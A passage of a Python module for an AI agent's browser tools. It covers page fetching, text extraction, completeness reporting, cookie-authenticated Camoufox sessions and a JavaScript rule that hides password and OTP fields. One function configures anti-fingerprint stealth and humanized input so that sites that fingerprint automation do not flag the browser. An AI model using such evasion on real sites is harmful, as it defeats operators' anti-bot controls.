"""
DPC Agent — Browser Tools.

Provides web browsing capabilities for the embedded agent:
- Web page fetching and parsing
- Text extraction from URLs
- Basic web search integration

Note: Full browser automation (Playwright/Selenium) is not included
to keep dependencies minimal. These tools use simple HTTP requests.
"""

from __future__ import annotations

import asyncio
import hashlib
import html as html_module
import json
import logging
import os
import platform
import re
import ssl
import time
import queue
import threading
import uuid
from concurrent.futures import Future
from dataclasses import dataclass
from datetime import datetime, timezone
from html.parser import HTMLParser
from io import StringIO
from pathlib import Path
from typing import Any, Dict, List, NamedTuple, Optional, Tuple
# Bound here rather than imported inside the callee: the route gate resolves
# a host per request, and that is the hot path.
from urllib.parse import urlparse as _urlparse

from .registry import ToolEntry, ToolContext

log = logging.getLogger(__name__)

# Try to import requests, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False


def _fetch_url(url: str, timeout: int = 30) -> Dict[str, Any]:
    """
    Fetch content from a URL.

    Args:
        url: URL to fetch
        timeout: Request timeout in seconds

    Returns:
        Dict with success, content, and error fields
    """
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        # Prefer markdown/plain text — servers that support content negotiation
        # (GitHub, Reddit, many CMS) return clean content, cutting token usage 77–86%.
        # Falls back to HTML for servers that ignore the header.
        "Accept": "text/markdown, text/plain, text/html;q=0.9, */*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
    }

    try:
        if HAS_REQUESTS:
            response = requests.get(url, headers=headers, timeout=timeout)
            response.raise_for_status()
            content = response.text
            return {
                "success": True,
                "content": content,
                "status_code": response.status_code,
                "content_type": response.headers.get("Content-Type", ""),
            }
        else:
            req = urllib.request.Request(url, headers=headers)
            # Create SSL context with system certificates for proper TLS verification
            ssl_context = ssl.create_default_context()
            with urllib.request.urlopen(req, timeout=timeout, context=ssl_context) as response:
                content = response.read().decode("utf-8", errors="replace")
                return {
                    "success": True,
                    "content": content,
                    "status_code": 200,
                    "content_type": response.headers.get("Content-Type", ""),
                }

    except Exception as e:
        return {"success": False, "error": str(e)}


class _TextExtractor(HTMLParser):
    """HTML parser that extracts text content, skipping script/style tags.

    Uses HTMLParser instead of regexps for robustness against malformed HTML
    and edge cases that regexp-based filtering misses (e.g., spaces before
    closing tags, attributes containing '>', malformed HTML).
    """

    def __init__(self):
        super().__init__()
        self.text = StringIO()
        self.skip_tags = {'script', 'style'}
        self.skip_depth = 0

    def handle_starttag(self, tag, attrs):
        """Track when we enter a script or style tag."""
        if tag in self.skip_tags:
            self.skip_depth += 1

    def handle_endtag(self, tag):
        """Track when we exit a script or style tag."""
        if tag in self.skip_tags and self.skip_depth > 0:
            self.skip_depth -= 1

    def handle_data(self, data):
        """Collect text data, skipping script/style content."""
        if self.skip_depth == 0:
            self.text.write(data)

    def get_text(self) -> str:
        """Get the extracted and cleaned text."""
        text = self.text.getvalue()

        # Clean up whitespace
        text = re.sub(r"\s+", " ", text)
        text = re.sub(r"\n\s*\n", "\n\n", text)

        return text.strip()


def _extract_text(html: str) -> str:
    """
    Extract readable text from HTML.

    Uses HTMLParser instead of regexps for robustness against malformed HTML
    and edge cases that regexp-based filtering misses. This addresses CodeQL
    warning py/bad-tag-filter about regexp-based HTML tag filtering.

    Args:
        html: HTML content

    Returns:
        Extracted text with script/style content removed
    """
    import html as html_module

    # Use HTMLParser to extract text, skipping script/style tags
    parser = _TextExtractor()
    parser.feed(html)
    parser.close()

    text = parser.get_text()

    # Decode HTML entities
    text = html_module.unescape(text)

    return text


_SIZE_PRESETS = {
    "s": 5000,
    "m": 10000,
    "l": 25000,
    "f": None,
}


_APP_SHELL_MARKERS = (
    'id="root"', "id='root'", 'id="app"', "id='app'",
    "__NEXT_DATA__", "data-reactroot", "ng-app",
    "window.__NUXT__", "__remixContext", "data-svelte",
)


def _page_signals(html: str, text: str) -> Dict[str, Any]:
    """What the fetched bytes themselves say about their own completeness.

    Three questions the tool used to answer with silence, and what is
    actually available to answer them without a second request:

    * did the transport cut the document — a body that ends in `</html>`
      was not cut short mid-stream. It does NOT establish that this is the
      page that was asked for: a CDN error page and a login wall are also
      complete documents.
    * can content appear after the first frame — a page with no script tags
      and no app-shell marker cannot render anything else, whatever its
      length. One with them can, and then the absence of further content is
      simply not established by a static fetch.
    * how much of the fetched bytes became text.

    Measured 2026-08-23: example.com is 559 chars of HTML, 0 script tags, no
    marker — complete and inert. habr.com/ru/articles/1072656 is 240 140
    chars with 14 script tags and `id="app"` — its article text arrives
    server-rendered, but the page is a JS application, so "51 685 chars is
    all of it" was never something the tool could know.
    """
    stripped = html.rstrip()
    scripts = len(re.findall(r"<script\b", html, re.I)) if html else 0
    markers = [m for m in _APP_SHELL_MARKERS if m in html] if html else []
    return {
        "html_chars": len(html),
        "text_chars": len(text),
        # No HTML means the question was not asked, not that the answer is no.
        # Measured 2026-08-24 over the 41 audit rows the line had collected:
        # 8 carried document_closed=false and 4 of those 8 had html_chars=0 —
        # rows where the body was never read (a clean-text content type takes
        # that route), so the detector was reporting "cut" for a reason that
        # has nothing to do with truncation. Half of the only signal this
        # instrument produces was its own artefact.
        "document_closed": bool(stripped.endswith("</html>")) if html else None,
        "script_tags": scripts,
        "app_shell_markers": markers,
        "js_capable": bool(scripts or markers),
    }


def _completeness_header(
    url: str,
    sig: Dict[str, Any],
    renderer: str,
    rendered_chars: Optional[int],
    shown: int,
    total: int,
    preset: str,
    session: Optional[str] = None,
    saved_to: Optional[str] = None,
    save_warning: Optional[str] = None,
) -> str:
    """The line the entry was opened for: three separate statements about
    completeness, never collapsed into one "truncated" or one silence.

    (c) the preset cut what was fetched — always known.
    (a) the transport cut the document — knowable from the body's own end.
    (b) content can appear after the first frame — knowable as *possible*,
        never as absent; a static fetch cannot prove a page has no more.

    Deliberately not a percentage. A web page has no total length until it
    is fully fetched, so any figure of "how much of the page" would be the
    same invented number the agent guessed by hand before this existed.
    """
    parts = [f"[browse_page {url}"]
    if sig.get("html_chars"):
        parts.append(f"fetched {sig['html_chars']} chars of HTML → {total} chars of markdown")
    else:
        parts.append(f"{total} chars")

    # Which browser served this, in the arguments the caller actually passed.
    # Deliberately not a statement about cookies: the session may carry a login
    # this call did not ask for, and naming one would be a claim nobody checked.
    if session:
        parts.append(f"session: {session}")

    if renderer == "camoufox":
        parts.append(
            f"renderer: browser (JS executed, {rendered_chars} chars) — this is what was"
            " visible at the moment of the snapshot; a page can still load more on scroll"
        )
    else:
        if sig.get("js_capable"):
            why = f"{sig.get('script_tags', 0)} script tags"
            if sig.get("app_shell_markers"):
                why += f", app-shell marker {sig['app_shell_markers'][0]}"
            note = (
                f"renderer: static fetch, JS NOT executed — this page runs JS ({why}),"
                " so content rendered after the first frame is not included and its"
                " absence is NOT established; pass verify=true to render and compare"
            )
            if rendered_chars is not None:
                note += f" (verify ran: browser saw {rendered_chars} chars)"
            parts.append(note)
        else:
            parts.append(
                "renderer: static fetch — no script tags and no app-shell marker,"
                " so nothing further can render into this page"
            )

    if sig.get("html_chars"):
        if sig.get("document_closed"):
            parts.append(
                "transport: body ends with </html>, so the stream was not cut short"
                " — this does not establish that it is the page you asked for, a CDN"
                " error page or a login wall is also a complete document"
            )
        else:
            parts.append(
                "transport: body does NOT end with </html> — it may have been cut"
                " before the end of the document"
            )

    # What the reader can actually do next. The old sentence offered a bigger
    # preset and nothing else, which fails twice: it offers 'l' to a caller who
    # already passed 'l', and every preset is cut again downstream at
    # TOOL_RESULT_CHAR_CAP, so a bigger one can return a page the model still
    # never sees. save_to is the only continuation that survives that second cut.
    from ..loop import TOOL_RESULT_CHAR_CAP

    if save_warning:
        parts.append(save_warning)
    if saved_to:
        parts.append(
            f"saved: all {total} chars written to {saved_to} — read it with"
            f" read_file(path, offset=, limit=)"
        )
    elif shown < total:
        bigger = {"s": "'m', 'l' or 'f'", "m": "'l' or 'f'", "l": "'f'"}.get(preset)
        how = f"use size={bigger}, or " if bigger else "use "
        parts.append(
            f"preset {preset} kept {shown} of {total} chars — {how}"
            f"save_to='page.md' to write the whole text to a file"
        )
    elif total > TOOL_RESULT_CHAR_CAP:
        parts.append(
            f"preset {preset} did not cut this: all {total} chars are here, but a tool"
            f" result is cut again at {TOOL_RESULT_CHAR_CAP} chars before it reaches you"
            f" — pass save_to='page.md' to read the rest with read_file"
        )
    else:
        parts.append(f"preset {preset} did not cut this: all {total} chars are here")
    return " | ".join(parts) + "]"


def _page_answer(
    header: str, full_text: str, body: str, saved_to: Optional[str],
) -> str:
    """Header, then the map of the saved file, then the body.

    The table of contents rides only on a saved page: its offsets are into the
    file, and printing them beside a body that was cut would point a reader at
    positions the answer does not contain.
    """
    toc = _markdown_toc(full_text) if saved_to else ""
    return f"{header}\n\n{toc}\n\n{body}" if toc else f"{header}\n\n{body}"


_TOC_MAX_ENTRIES = 40


def _markdown_toc(text: str, limit: int = _TOC_MAX_ENTRIES) -> str:
    """Headings with the line each one starts on, counted as `read_file` counts.

    Lines, not characters: `read_file` paginates with `lines[offset:offset+limit]`
    (`core.py:_paginate_content`), so a character offset handed to it is read as
    a line number and lands past the end of any real page. An offset that points
    at nothing is the defect this whole entry is about, one level down.
    """
    # `splitlines`, not `split("\n")`, because that is what `read_file` counts
    # with (`_paginate_content` → `content.splitlines(keepends=True)`). They
    # differ on a lone CR and on the other separators `splitlines` knows: a page
    # carrying one shifts every offset below it, which is the same defect as
    # counting characters, one layer smaller.
    entries = []
    for offset, line in enumerate(text.splitlines()):
        stripped = line.lstrip()
        if stripped.startswith("#"):
            hashes = len(stripped) - len(stripped.lstrip("#"))
            rest = stripped[hashes:]
            # ATX headings need the space. Without this a line of prose
            # starting with a hashtag is filed as a section of the page.
            if rest[:1].isspace() and rest.strip() and hashes <= 3:
                entries.append((hashes, rest.strip(), offset))
    if not entries:
        return ""
    shown = entries[:limit]
    lines = [
        f"{'  ' * (level - 1)}{title} @{start}" for level, title, start in shown
    ]
    if len(entries) > limit:
        lines.append(f"... and {len(entries) - limit} more headings")
    return (
        "[toc — line offsets into the saved file, for read_file(offset=, limit=)]\n"
        + "\n".join(lines)
    )


def _save_page_markdown(
    ctx, save_to: Optional[str], text: str,
) -> Tuple[Optional[str], Optional[str]]:
    """Write the whole markdown where `read_file` can page through it.

    Returns (path, warning); a write that fails is reported in the header
    rather than raised, because the page itself was fetched successfully.
    """
    if not save_to:
        return None, None
    try:
        from .core import _resolve_file_path

        target = _resolve_file_path(ctx, save_to, require_write=True)
        target.parent.mkdir(parents=True, exist_ok=True)
        # newline="" so the page is stored as it arrived. The default translates
        # "\n" to the platform's ending, which on Windows turns a page that
        # already uses CRLF into "\r\r\n" — read back through universal newlines
        # that is one blank line per line, and every TOC offset below the first
        # one is wrong. The web decides this file's endings, not the host.
        target.write_text(text, encoding="utf-8", newline="")
        return str(target), None
    except (PermissionError, OSError, ValueError) as exc:
        return None, f"save_to '{save_to}' failed: {type(exc).__name__}: {exc}"


def _rendered_page_answer(
    url: str, html: str, text: str, size: str, session: str,
    saved_to: Optional[str] = None, save_warning: Optional[str] = None,
) -> str:
    """The same header for the two `browse_page` paths a real browser serves.

    Until 2026-08-24 `use_auth` and `keep_open` returned a one-line
    `Content from … (markdown, auth=…/headed, N chars)`: no transport
    statement, no renderer statement, no preset statement — and the cut notice
    in the TAIL, which is where `_truncate_tool_result` removes it. The
    anonymous path had carried all four since 2026-08-23, so the three
    detectors were absent from exactly the two paths that reach a logged-in
    site, where "is this the page or a login wall" is the whole question.
    Observed in agent_001's own tool calls the same day:
    `Content from https://tomsk.hh.ru/… (markdown, headed, 407 chars)` — 407
    characters of a wall, announced as a page.

    `renderer="camoufox"` is not a guess here: both callers get their HTML
    from a live browser, so the honest sentence is the snapshot caveat rather
    than the static fetch's "JS NOT executed".
    """
    sig = _page_signals(html, text)
    full_text = text
    max_chars = _SIZE_PRESETS.get(size, _SIZE_PRESETS["m"])
    total = len(text)
    shown = min(total, max_chars) if max_chars else total
    if max_chars and total > max_chars:
        text = text[:max_chars]
    header = _completeness_header(
        url, sig, "camoufox", total, shown, total, size, session=session,
        saved_to=saved_to, save_warning=save_warning,
    )
    return _page_answer(header, full_text, text, saved_to)


def _browse_sync(url: str) -> Dict[str, Any]:
    result = _fetch_url(url)
    if not result["success"]:
        return result

    content = result["content"]
    content_type = result.get("content_type", "")
    is_clean_text = any(ct in content_type for ct in ("text/markdown", "text/plain"))

    if is_clean_text:
        text = content
    else:
        try:
            import trafilatura
            text = trafilatura.extract(
                content,
                output_format="markdown",
                include_formatting=True,
                include_links=True,
                include_tables=True,
                favor_recall=True,
            )
        except Exception:
            text = None

        if not text:
            try:
                from ddgs import DDGS
                with DDGS() as ddgs:
                    extracts = list(ddgs.extract([url]))
                    if extracts and extracts[0].get("content"):
                        text = extracts[0]["content"]
            except Exception:
                pass

        if not text:
            text = _extract_text(content)

    result["text"] = text
    result["signals"] = _page_signals(content if not is_clean_text else "", text or "")
    # Historically: `len(text) < 200` alone. Measured 2026-08-23 — that fires
    # on example.com (113 chars of text, a complete document with ZERO script
    # tags), buying a 7-10 s Camoufox launch for a page no browser could add
    # anything to. The length still gates it, but a page has to be able to
    # render for rendering to be worth trying.
    result["needs_js"] = (
        not is_clean_text
        and len(text or "") < 200
        and result["signals"]["js_capable"]
    )
    return result


_CAMOUFOX_OS_MAP = {"Windows": "windows", "Darwin": "macos", "Linux": "linux"}


def _camoufox_launch_kwargs() -> Dict[str, Any]:
    """Anti-fingerprint hardening shared by every Camoufox call site.

    Why: defaults pass only `headless`; sites that aggressively fingerprint
    Firefox-based automation (x.com class) flag the resulting inconsistencies.
    `humanize` adds human-like cursor latency, `os` declares the real host
    platform so the spoofed fingerprint matches the TLS / network stack.

    `firefox_user_prefs` disables Firefox 109+ bounce-tracker protection,
    which classifies sites like x.com as redirect trackers and auto-purges
    their state every 3600 s without user activation — that fights the
    site's own session/storage management and can leave the client-side
    router half-loaded. Orthogonal to Camoufox stealth (which targets
    fingerprinting), so safe to disable for the agent profile.

    `geoip=True` would also help (timezone/locale from IP) but requires the
    optional `camoufox[geoip]` extra (~50 MB GeoLite2 DB). Skipped here to
    keep the install lightweight; add the extra and re-enable if needed.
    """
    kwargs: Dict[str, Any] = {
        "humanize": True,
        "firefox_user_prefs": {
            "privacy.bounceTrackingProtection.mode": 0,
        },
    }
    cam_os = _CAMOUFOX_OS_MAP.get(platform.system())
    if cam_os:
        kwargs["os"] = cam_os
    return kwargs


def _new_context_kwargs(headed: bool) -> Dict[str, Any]:
    """What every browser context this module opens is made with.

    Without `accept_downloads` the browser cancels a download instead of
    producing a file. With it the bytes land in a temp directory the context
    deletes at close, so `browser_download` copies them into the sandbox
    before returning. No `downloads_path`: one path set for the whole context
    would land outside the sandbox, and the tool resolves a directory per
    call instead.

    `no_viewport` for a visible window only — see `_open`.
    """
    kwargs: Dict[str, Any] = {"accept_downloads": True}
    if headed:
        kwargs["no_viewport"] = True
    return kwargs


def _attach_page_diagnostics(page, agent_id: str = "<anonymous>") -> None:
    """Surface Camoufox-side runtime events into dpc-client.log so anti-bot
    stubs, stalled JS challenges, page-level exceptions, or failed network
    requests are visible from the log without rerunning the call. Pure
    side-channel observability — no impact on extraction or auth flow.
    """
    def _on_console(msg) -> None:
        try:
            log.info(
                "camoufox.console[agent=%s,type=%s] %s",
                agent_id, msg.type, msg.text,
            )
        except Exception:
            pass

    def _on_pageerror(err) -> None:
        try:
            log.warning("camoufox.pageerror[agent=%s] %s", agent_id, err)
        except Exception:
            pass

    def _on_requestfailed(request) -> None:
        try:
            failure = request.failure or "unknown"
            log.warning(
                "camoufox.requestfailed[agent=%s] %s %s — %s",
                agent_id, request.method, request.url, failure,
            )
        except Exception:
            pass

    try:
        page.on("console", _on_console)
        page.on("pageerror", _on_pageerror)
        page.on("requestfailed", _on_requestfailed)
    except Exception as e:
        log.debug("attach diagnostics failed: %s", e)


_SESSION_DEAD_MARKERS = (
    "target page, context or browser has been closed",
    "browser has been closed",
    "browser closed",
    "connection closed",
    "target closed",
    "page closed",
    "browser is not connected",
    "session is closed",
)


def _is_session_dead(exc: BaseException) -> bool:
    """True when the exception says the browser/page is gone, as opposed
    to the navigation itself having failed.

    Everything that is not on this list — a timeout, an aborted load, a
    navigation superseded by another navigation — leaves a perfectly
    usable browser behind, and answering it by tearing the browser down
    costs a relaunch, the page state, and (headed) a window that vanishes
    and reappears in front of the user.
    """
    text = f"{type(exc).__name__}: {exc}".lower()
    return any(marker in text for marker in _SESSION_DEAD_MARKERS)


def _browse_with_camoufox(url: str, agent_id: str = "<anonymous>") -> Optional[str]:
    try:
        from camoufox.sync_api import Camoufox
    except ImportError:
        return None

    try:
        with Camoufox(headless=True, **_camoufox_launch_kwargs()) as browser:
            page = browser.new_page()
            _attach_page_diagnostics(page, agent_id=agent_id)
            page.goto(url, wait_until="domcontentloaded", timeout=60000)
            html = page.content()

        import trafilatura
        text = trafilatura.extract(
            html,
            output_format="markdown",
            include_formatting=True,
            include_links=True,
            include_tables=True,
            favor_recall=True,
        )
        return text
    except Exception as e:
        log.warning(f"Camoufox fallback failed for {url}: {e}")
        return None


# ─────────────────────────────────────────────────────────────
# ADR-028 T4 — AuthBrowser (authenticated read-only Camoufox)
# ─────────────────────────────────────────────────────────────


class AuthRequiredError(Exception):
    """Raised when no cookies exist for the requested domain in the
    agent's vault. Surfaced to the agent as a re-login prompt."""


class AuthExpiredError(Exception):
    """Raised when cookies exist but have expired. Surfaced to the agent
    as a re-login prompt."""


def _to_playwright_cookies(cookies: list[dict]) -> list[dict]:
    """Convert DPC snake_case Cookie dicts → Playwright camelCase format.

    Mirrors the T1 spike `normalize_cookie()` output:
      httponly → httpOnly, samesite → sameSite. expires stays as Unix
      epoch seconds (Playwright accepts numeric). Empty samesite is
      omitted rather than passed as None (Playwright rejects None)."""
    out = []
    for c in cookies:
        pc = {
            "name": c["name"],
            "value": c["value"],
            "domain": c.get("domain") or "",
            "path": c.get("path") or "/",
            "secure": bool(c.get("secure", False)),
            "httpOnly": bool(c.get("httponly", False)),
        }
        if c.get("expires") is not None:
            pc["expires"] = c["expires"]
        if c.get("samesite"):
            pc["sameSite"] = c["samesite"]
        out.append(pc)
    return out


def _from_playwright_cookies(cookies: list[dict]) -> list[dict]:
    """Reverse of `_to_playwright_cookies`: Playwright camelCase →
    DPC snake_case format the vault writes. Used by ADR-029 Task 004
    by the cookie writeback that copies a session's jar to the vault."""
    out = []
    for c in cookies:
        sc = {
            "name": c["name"],
            "value": c["value"],
            "domain": c.get("domain") or "",
            "path": c.get("path") or "/",
            "secure": bool(c.get("secure", False)),
            "httponly": bool(c.get("httpOnly", False)),
        }
        expires = c.get("expires")
        if expires is not None and expires > 0:
            sc["expires"] = expires
        if c.get("sameSite"):
            sc["samesite"] = c["sameSite"]
        out.append(sc)
    return out


class _WritebackTally(NamedTuple):
    """What one cookie writeback did, in the terms its audit row carries.

    Counts and one flag, never a cookie: enough to answer whether a
    sign-in reached the vault without opening the jar, which is the thing
    the audit exists to replace. `jars` is here because a scope of two
    domains writes two of them and a cookie count alone cannot say both
    were reached. `session_cookie` takes the vault's own word — a cookie
    with no live `expires`, which `web_auth.filter_expired` keeps for that
    reason — and stays a flag, since a count of them reads as a number of
    logins, which no jar can say."""

    cookies: int
    refused: list[str]
    jars: int
    session_cookie: bool


# Hostname per origin, for the route gate: one page load asks for the same
# few origins hundreds of times and the parse is the bulk of what a repeated
# request costs. Bounded because the asking is driven by the page.
_HOST_CACHE: dict[str, str] = {}
_HOST_CACHE_MAX = 512


def _url_host(url: str) -> str:
    """Lowercased hostname, or "" for anything that has none."""
    try:
        # Everything up to the path; the authority alone decides the host, so
        # every URL sharing this prefix shares the answer `urlparse` gives.
        end = url.find("/", 8)
        origin = url if end == -1 else url[:end]
        host = _HOST_CACHE.get(origin)
        if host is None:
            host = (_urlparse(url).hostname or "").lower()
            if len(_HOST_CACHE) >= _HOST_CACHE_MAX:
                _HOST_CACHE.clear()
            _HOST_CACHE[origin] = host
        return host
    except Exception:
        return ""


# These take the request, not the route: the gate runs per request and
# resolving `route.request` again for each field is work the repeat case
# does not need.
def _request_method(request) -> str:
    try:
        return request.method or ""
    except Exception:
        return ""


def _request_resource_type(request) -> str:
    try:
        return request.resource_type or ""
    except Exception:
        return ""


def _request_initiator(request) -> str:
    """URL of the frame that made this request, or "" when none is readable.

    In an ungated window this is the only field separating "the site called
    its identity provider" from "something went out on its own"."""
    try:
        frame = request.frame
        return (frame.url if frame is not None else "") or ""
    except Exception:
        return ""


def _domain_matches(url: str, etld1: str) -> bool:
    """Check whether URL host is the same eTLD+1 as `etld1` (or a
    subdomain of it). Prevents leaking cookies to unrelated hosts that
    happen to embed the auth-domain string in their URL (path / query
    params / fragments)."""
    host = _urlparse(url).hostname
    if not host:
        return False
    host = host.lower()
    etld1 = etld1.lower()
    return host == etld1 or host.endswith("." + etld1)


# S144 SHUTDOWN-PIPE-DRAIN: process-wide registry of live AuthBrowser
# (Camoufox) instances. Populated by `__enter__` / `_open`, drained by
# `close()` / `__exit__`. CoreService.shutdown() iterates and closes
# remaining entries so Camoufox subprocesses are not left holding IOCP
# overlapped reads when the asyncio loop tears down (the symptom was
# Mike's "IocpProactor overlapped#=1 ... running for 159s" log after
# every clean shutdown that followed a popup-fallback session).
#
# Set semantics (not list): tools that legitimately spawn nested
# AuthBrowser contexts will register both, and removing the inner one
# via `discard` is a no-op for the outer. Mutated from worker threads
# via _auth_browse_html / _auth_browse — Python's `set` is thread-safe
# for add/discard against single elements per the GIL contract; no
# Lock needed.
_active_camoufox_browsers: set["AuthBrowser"] = set()


def get_active_camoufox_browsers() -> set["AuthBrowser"]:
    """Accessor for CoreService.shutdown() — returns the live set
    (mutation is intentional). Defensive copy is the caller's job."""
    return _active_camoufox_browsers


# ADR-029 Task 002: dict registry for stateful per-agent sessions.
# Parallel to _active_camoufox_browsers (set), which keeps the S144
# shutdown defense — set tracks ALL live AuthBrowser instances
# regardless of mode; dict is the lookup path for the keep_open=True
# stateful flow.
_active_browser_sessions: dict[str, "AuthBrowser"] = {}


def get_active_browser_sessions() -> dict[str, "AuthBrowser"]:
    """Accessor for browse_page handler — returns the live dict
    (mutation is intentional). Used by _get_or_create_session."""
    return _active_browser_sessions


# Headless browsers kept for the `browse_page` JS fallback, one per agent.
# Deliberately separate from `_active_browser_sessions`: that registry is
# what the interactive `browser_*` tools resolve, and a fetch must never
# navigate the page an agent is holding refs into. Same idle sweep, same
# shutdown set — only the lookup is distinct.
_fetch_sessions: dict[str, "AuthBrowser"] = {}


def get_fetch_sessions() -> dict[str, "AuthBrowser"]:
    """Accessor for tests and shutdown — returns the live dict."""
    return _fetch_sessions


async def sweep_closed_windows() -> int:
    """Close headed sessions whose window the person has closed.

    Separate from the idle sweep and running far more often, because the
    two answer different questions. Idle asks how long nobody has used a
    browser and can afford half an hour; this asks whether the window is
    still there at all, and the person who closed it expects the processes
    to go with it. Returns the number of sessions released.
    """
    released = 0
    for agent_id, session in list(_active_browser_sessions.items()):
        if not session._headed:
            continue
        started = time.monotonic()
        try:
            gone = await _run_in_session(
                session, "window_is_gone",
                _touch=False, _timeout=WINDOW_PROBE_TIMEOUT_SECONDS,
            )
        except Exception as e:
            # Includes the timeout. A session that does not answer is not a
            # closed window — it is a busy or wedged one, and closing it
            # would take a live page away. Skip it and ask again next tick;
            # the idle sweep is what eventually collects a wedged session.
            log.debug("window probe failed for %s: %s", agent_id, e)
            continue
        log.debug(
            "window probe for %s: gone=%s in %.0f ms",
            agent_id, gone, (time.monotonic() - started) * 1000,
        )
        if not gone:
            continue
        log.info("Window closed for %s — releasing the browser", agent_id)
        try:
            await _run_in_session(session, "close", _touch=False)
        except Exception as e:
            log.warning(
                "Error releasing %s after its window went away: %s", agent_id, e
            )
        _active_browser_sessions.pop(agent_id, None)
        released += 1
    return released


def _session_idle_seconds(session, now: float) -> float:
    """Seconds since anything used this session, by either clock.

    A visible window is opened so a person can sign in by hand, and while
    they do the agent is by construction silent — so its own traffic counts
    as use. A window whose page has gone quiet still ages out, which is the
    case the idle sweep exists for.
    """
    page_event = getattr(session, "_last_page_event", 0.0) or 0.0
    return now - max(session._last_activity, page_event)


async def cleanup_idle_browser_sessions() -> int:
    """Close browser sessions idle longer than IDLE_TIMEOUT_SECONDS.

    Called periodically from a background task in service.py.
    Returns the number of sessions closed.
    """
    now = time.monotonic()
    closed = 0
    for registry, label in (
        (_active_browser_sessions, "browser session"),
        (_fetch_sessions, "fetch browser"),
    ):
        for agent_id, session in list(registry.items()):
            idle = _session_idle_seconds(session, now)
            if idle <= IDLE_TIMEOUT_SECONDS:
                continue
            page_event = getattr(session, "_last_page_event", 0.0) or 0.0
            # Which clock ran out, and on what window: without it a closed
            # session leaves nobody able to say why it was closed.
            log.info(
                "Closing idle %s for %s (idle %.0fs; last agent call %.0fs ago;"
                " last page event %s; headed=%s; url=%s)",
                label, agent_id, idle,
                now - session._last_activity,
                ("%.0fs ago" % (now - page_event)) if page_event else "never",
                getattr(session, "_headed", False),
                getattr(session, "_last_known_url", "") or "-",
            )
            try:
                await _run_in_session(session, "close")
            except Exception as e:
                log.warning("Error closing idle %s %s: %s", label, agent_id, e)
            registry.pop(agent_id, None)
            closed += 1
    return closed


_session_locks: dict[str, asyncio.Lock] = {}

def _get_session_lock(agent_id: str) -> asyncio.Lock:
    """Return (creating if missing) a per-agent asyncio.Lock used by
    every `browser_*` tool handler to serialize concurrent calls
    against the same AuthBrowser instance (ADR-029 Task 006 §Failure
    handling). Recreates the lock if the current event loop differs
    from the one the lock was created on (happens when registry.py
    execute() runs in a fresh loop via run_until_complete)."""
    lock = _session_locks.get(agent_id)
    try:
        current_loop = asyncio.get_running_loop()
    except RuntimeError:
        current_loop = None
    if lock is not None and current_loop is not None:
        try:
            lock_loop = lock._loop  # type: ignore[attr-defined]
            if lock_loop is not current_loop:
                lock = None
        except AttributeError:
            pass
    if lock is None:
        lock = asyncio.Lock()
        _session_locks[agent_id] = lock
    return lock


# The rules that decide a field is a secret, and the name resolution one of
# them reads. Its own string because `browser_select` asks the same question
# of the same element: a select this predicate withholds is the one the
# snapshot prints as `(N options)`, and a second copy of the rules is how the
# two would come to disagree.
_SECRET_FIELD_JS = """
  function getName(el) {
    const aria = el.getAttribute('aria-label');
    if (aria) return aria.trim().slice(0, 200);
    const labelledby = el.getAttribute('aria-labelledby');
    if (labelledby) {
      const ref = document.getElementById(labelledby);
      if (ref) return (ref.textContent || '').trim().slice(0, 200);
    }
    const placeholder = el.getAttribute('placeholder');
    if (placeholder) return placeholder.trim().slice(0, 200);
    const alt = el.getAttribute('alt');
    if (alt) return alt.trim().slice(0, 200);
    const title = el.getAttribute('title');
    if (title) return title.trim().slice(0, 200);
    const tag = el.tagName.toLowerCase();
    if (tag === 'a' || tag === 'button' ||
        tag === 'h1' || tag === 'h2' || tag === 'h3' ||
        tag === 'h4' || tag === 'h5' || tag === 'h6' ||
        tag === 'label' || tag === 'option' ||
        tag === 'span' || tag === 'strong' || tag === 'em' ||
        tag === 'p' || tag === 'li' || tag === 'td' || tag === 'th') {
      const txt = (el.innerText || el.textContent || '').trim();
      return txt.slice(0, 200);
    }
    return '';
  }
  // A secret is not always typed into type=password: a one-time code and a
  // card number go into ordinary fields — of any tag, since a card expiry is
  // usually a select — and `autocomplete` is one of the things on the page
  // that says so. Tokens, because the attribute is a list.
  const SECRET_AUTOCOMPLETE = new Set([
    'current-password', 'new-password', 'one-time-code',
    'cc-number', 'cc-csc',
  ]);
  function isSecretAutocomplete(el) {
    const tokens = (el.getAttribute('autocomplete') || '')
      .toLowerCase().trim().split(/\\s+/);
    return tokens.some(
      (t) => SECRET_AUTOCOMPLETE.has(t) || t.indexOf('cc-exp') === 0
    );
  }
  // Most forms never set `autocomplete`; what they do set is a telling name.
  // Boundaries are lookarounds rather than \\b, because JS counts `_` as a
  // word character — \\bpin\\b walks straight past user_pin and sms_otp. The
  // two sides are deliberately unequal: a letter on either side makes an
  // ordinary word (pinball, sultan), but a digit on the right is how forms
  // number a serial field — otp1, cvv2, ssn1 — so only the left side refuses
  // digits. A digit on the left stays open, which keeps every id ending in a
  // number printable. Left out on purpose: iban, account/routing number, pan.
  // Those are identifiers people read aloud, and catching them would blind
  // the agent to ordinary banking forms.
  const SECRET_NAME_RE = new RegExp([
    '(?<![a-z0-9])(otp|pin|csc|ssn|cvv|cvc|2fa|mfa|tan)(?![a-z])',
    'passw|pwd|passcode|passphrase|secret|token|api.?key',
    'one.?time|security.?code|verification.?code|verify.?code',
    'card.?(num|no(?![a-z]))',
    'cc.?(num|no(?![a-z])|csc|cvc|cvv|exp)',
  ].join('|'));
  const SECRET_NAME_ATTRS = ['name', 'id', 'aria-label', 'placeholder'];
  function isSecretName(el) {
    // Each attribute is read straight off the element and tested on its own:
    // getName() stops at the first one it finds, so a placeholder="Search"
    // would talk the walk out of a name="otp" sitting right beside it.
    // Lowercased, because the markup keeps the author's capitals.
    for (const attr of SECRET_NAME_ATTRS) {
      const v = (el.getAttribute(attr) || '').toLowerCase();
      if (v && SECRET_NAME_RE.test(v)) return true;
    }
    // The resolved name, on top of those four and never instead of them: it
    // is what carries title, alt and the text an aria-labelledby points at,
    // and it is the string the model reads beside the value. On its own it
    // could be masked, since it stops at its first source; as one more
    // disjunct it can only add secrecy.
    const resolved = (getName(el) || '').toLowerCase();
    if (resolved && SECRET_NAME_RE.test(resolved)) return true;
    // A <label for> or a wrapping <label> — the commonest way a real form
    // names a field, and nothing above reads one. `labels` is absent on
    // anything that is not a labelable control, hence the guard.
    const labels = el.labels;
    if (labels && labels.length) {
